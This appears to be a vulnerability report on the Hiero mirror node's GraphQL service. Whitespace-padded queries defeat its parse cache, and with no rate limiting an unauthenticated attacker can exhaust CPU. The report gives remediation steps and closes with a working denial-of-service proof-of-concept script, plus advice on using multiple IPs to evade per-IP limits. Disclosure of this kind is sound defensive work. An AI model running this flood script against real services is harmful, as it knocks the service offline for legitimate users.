### Title
GraphQL Parser Cache Bypass via Whitespace Padding Enables Unauthenticated CPU Exhaustion DoS

### Summary
The `CachedPreparsedDocumentProvider` keys its parse cache on the raw query string, so whitespace-padded variants of the same logical query each produce a cache miss and trigger a full ANTLR4 parse-and-validate cycle. The graphql module has no application-level rate limiting (unlike the `web3` module), and the only infrastructure guard (`inFlightReq: amount: 5` per source IP in Traefik) is trivially bypassed with multiple source IPs. An unauthenticated attacker can therefore drive sustained, maximum-cost parse work on every request, exhausting JVM threads and CPU.

### Finding Description

**Cache bypass root cause** — `CachedPreparsedDocumentProvider.getDocumentAsync` keys the Caffeine cache on `executionInput.getQuery()`, the raw query string:

```java
// graphql/src/main/java/org/hiero/mirror/graphql/cache/CachedPreparsedDocumentProvider.java:26
return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
```

Two queries that are semantically identical but differ by a single whitespace character are different cache keys. The parser limits set in `GraphQlConfiguration` define the *maximum* work an attacker can force per request, not a minimum:

```java
// graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java:33-38
Consumer<Builder> consumer =
        b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
ParserOptions.setDefaultParserOptions(...);
ParserOptions.setDefaultOperationParserOptions(...);
```

An attacker crafts queries that consume all three budgets simultaneously — 10 000 characters, 1 000 real tokens, 1 000 whitespace tokens — while varying the whitespace pattern on each request. Every such request is a cache miss and forces a full ANTLR4 lex+parse+validate pass.

**No application-level rate limiting in the graphql module** — A grep across `graphql/src/**/*.java` returns zero matches for any rate-limiting or throttling primitive. The `web3` module has a full bucket4j `ThrottleConfiguration`/`ThrottleManager` stack; the `graphql` module has none.

**Infrastructure guards are insufficient**:
- Traefik `inFlightReq: amount: 5` (per source IP, `depth: 1`) is bypassable with ≥ N source IPs (rented proxies, cloud egress IPs, or a small botnet).
- GCP gateway `maxRatePerEndpoint: 250` is a per-backend-pod ceiling, not a per-client ceiling, so it does not throttle individual attackers.
- Both controls are infrastructure-optional; `global.middleware: false` is the default, meaning the Traefik middleware may not be active in all deployments.

**Exploit flow**:
1. Attacker generates a corpus of queries of the form `{ account(input: {entityId: {num: 1}}) { balance } }` padded with varying whitespace to fill the 10 000-character budget and 1 000-whitespace-token budget.
2. Each unique string is a cache miss in the 1 000-entry Caffeine cache.
3. Attacker sends these at high concurrency from multiple source IPs, bypassing the per-IP Traefik guard.
4. Every request forces a full ANTLR4 parse+validate cycle on the JVM thread pool.
5. Thread pool and CPU saturate; legitimate requests queue and time out.

### Impact Explanation
CPU and thread-pool exhaustion causes the GraphQL service to become unresponsive to legitimate clients. Because the service is stateless and reads from the mirror-node database, a sustained attack degrades or eliminates read access to account data for all users. The impact is a complete denial of service for the GraphQL API endpoint, achievable without any credentials or privileged access.

### Likelihood Explanation
The attack requires only an HTTP client and knowledge of the public GraphQL endpoint (documented in `docs/graphql/README.md`). No authentication, API key, or special account is needed. Whitespace-padding to generate unique cache-miss queries is trivial to script. Bypassing the per-IP Traefik guard requires only a handful of distinct source IPs, which are freely available via cloud providers or proxies. The attack is fully repeatable and automatable.

### Recommendation
1. **Normalize query strings before caching**: Strip or canonicalize whitespace in the cache key (e.g., pass the query through a lightweight lexer that emits a canonical token stream as the key) so that semantically equivalent queries share a single cache entry regardless of whitespace variation.
2. **Add application-level rate limiting to the graphql module**: Implement a bucket4j (or equivalent) `ThrottleConfiguration` analogous to the one in the `web3` module, enforcing a per-IP or global requests-per-second ceiling at the Spring layer, independent of infrastructure middleware.
3. **Reduce parser limits**: The current `maxCharacters(10000)` / `maxWhitespaceTokens(1000)` combination allows far more parse work than any legitimate `account` query requires. Tighten these to values that cover the actual schema (e.g., `maxCharacters(500)`, `maxWhitespaceTokens(50)`).
4. **Enforce infrastructure middleware unconditionally**: Set `global.middleware: true` as the default and document that the Traefik `inFlightReq` guard is a required security control, not an optional one.

### Proof of Concept

```bash
# Generate 500 unique whitespace-padded cache-miss queries and send at high concurrency
python3 - <<'EOF'
import subprocess, threading

BASE = '{ account(input: {entityId: {num: 1}}) { balance } }'

def send(i):
    # Each query differs by i trailing spaces → unique cache key, always a miss
    q = BASE + (' ' * i)
    payload = '{"query": "' + q + '"}'
    subprocess.run([
        'curl', '-s', '-o', '/dev/null',
        '-X', 'POST', 'http://<GRAPHQL_HOST>/graphql/alpha',
        '-H', 'Content-Type: application/json',
        '-d', payload
    ])

threads = [threading.Thread(target=send, args=(i,)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
print("Done — monitor target CPU and response latency")
EOF
```

Observe CPU spike on the GraphQL pod and increasing response latency / 503 errors for concurrent legitimate requests.
